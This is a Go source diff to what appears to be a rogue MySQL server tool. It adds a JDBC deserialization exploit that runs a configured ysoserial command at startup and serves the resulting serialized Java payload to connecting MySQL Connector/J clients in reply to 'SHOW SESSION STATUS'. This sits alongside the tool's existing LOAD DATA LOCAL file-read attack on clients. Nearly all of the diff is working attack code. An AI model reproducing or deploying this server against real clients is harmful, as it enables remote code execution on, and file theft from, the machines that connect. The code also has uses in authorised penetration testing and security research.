@@ -8,6 +8,7 @@ import (
     "gopkg.in/yaml.v2"
     "io/ioutil"
     "os"
+    "os/exec"
     "path/filepath"
     "rogue_mysql_server/mysql"
     "strings"
@@ -23,17 +24,22 @@ type DB struct {
     mapLock   sync.Mutex
     fileIndex map[uint32]int
     config    Config
+
+    YsoserialOutput []byte
 }
 
 type Config struct {
-    Host          string              `yaml:"host"`
-    Port          string              `yaml:"port"`
-    FileList      []string            `yaml:"file_list"`
-    SavePath      string              `yaml:"save_path"`
-    Auth          bool                `yaml:"auth"`
-    Users         []map[string]string `yaml:"users"`
-    AlwaysRead    bool                `yaml:"always_read"`
-    VersionString string              `yaml:"version_string"`
+    Host             string              `yaml:"host"`
+    Port             string              `yaml:"port"`
+    FileList         []string            `yaml:"file_list"`
+    SavePath         string              `yaml:"save_path"`
+    Auth             bool                `yaml:"auth"`
+    Users            []map[string]string `yaml:"users"`
+    AlwaysRead       bool                `yaml:"always_read"`
+    VersionString    string              `yaml:"version_string"`
+    JdbcExploit      bool                `yaml:"jdbc_exploit"`
+    YsoserialCommand []string            `yaml:"ysoserial_command"`
+    AlwaysExploit    bool                `yaml:"always_exploit"`
 }
 
 func NativePassword(password string) string {
@@ -52,6 +58,23 @@ func NativePassword(password string) string {
     s := strings.ToUpper(hex.EncodeToString(s2))
 
     return fmt.Sprintf("*%s", s)
+}
+
+func CmdExec(args []string) []byte {
+    baseCmd := args[0]
+    cmdArgs := args[1:]
+
+    log.Infof("Exec: %v", args)
+
+    cmd := exec.Command(baseCmd, cmdArgs...)
+    out, err := cmd.Output()
+
+    if err != nil {
+        log.Errorf("Get error in payload generator %s", err)
+        log.Exit(-1)
+    }
+
+    return out
 }
 
 func main() {
@@ -80,6 +103,10 @@ func main() {
     db.fileIndex = make(map[uint32]int)
     db.Handler = db
     db.config = config
+
+    if config.JdbcExploit {
+        db.YsoserialOutput = CmdExec(config.YsoserialCommand)
+    }
 
     var authServer mysql.AuthServer
     if config.Auth {
@@ -131,8 +158,10 @@ func (db *DB) NewConnection(c *mysql.Conn) {
     if c.ConnAttrs != nil {
         log.Info("==== ATTRS ====")
         for name, value := range c.ConnAttrs {
-            if name == "_client_name" && value == "MySQL Connector/J" {
-                c.SupportLoadDataLocal = true // 测试发现只有 pymysql 和原生命令行会对这个 flag 真正进行修改
+            if name == "_client_name" && strings.Contains(value, "MySQL Connector") {
+                c.IsJdbcClient = true
+                c.SupportLoadDataLocal = true
+                // 测试发现只有 pymysql 和原生命令行会对这个 flag 真正进行修改
                 // 而且 Connector/J 默认值为 False, 所以这里做特殊兼容
             }
 
@@ -158,6 +187,30 @@ func (db *DB) ConnectionClosed(c *mysql.Conn) {
 func (db *DB) ComQuery(c *mysql.Conn, query string, callback func(*sqltypes.Result) error) error {
     log.Infof("Client from addr [%s], ID [%d] try to query [%s]", c.RemoteAddr(), c.ConnectionID, query)
 
+    // JDBC client exploit
+    if (c.IsJdbcClient && db.config.JdbcExploit) || db.config.AlwaysExploit {
+        if query == "SHOW SESSION STATUS" {
+            log.Infof("Client request `SESSION STATUS`, start exploiting...")
+            r := &sqltypes.Result{Fields: schemaToFields(Schema{
+                {Name: "Variable_name", Type: sqltypes.Blob, Nullable: false},
+                {Name: "Value", Type: sqltypes.Blob, Nullable: false},
+            })}
+            r.Rows = append(r.Rows, rowToSQL(Row{[]byte{}, db.YsoserialOutput}))
+
+            _ = callback(r)
+        } else if strings.HasPrefix(query, "/* mysql-connector-java-8") {
+            // 对于 mysql-connector-java-5 和 6，不用发送这些变量也能利用
+            r := getMysqlVars()
+
+            _ = callback(r)
+        } else {
+            r := &sqltypes.Result{}
+            _ = callback(r)
+        }
+        return nil
+    }
+
+    // mysql LOAD DATA LOCAL exploit
     if !c.SupportLoadDataLocal && !db.config.AlwaysRead { // 客户端不支持读取本地文件且没有开启总是读取，直接返回错误
         log.Info("Client not support LOAD DATA LOCAL, return error directly")
         c.WriteErrorResponse(fmt.Sprintf("You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1", query))
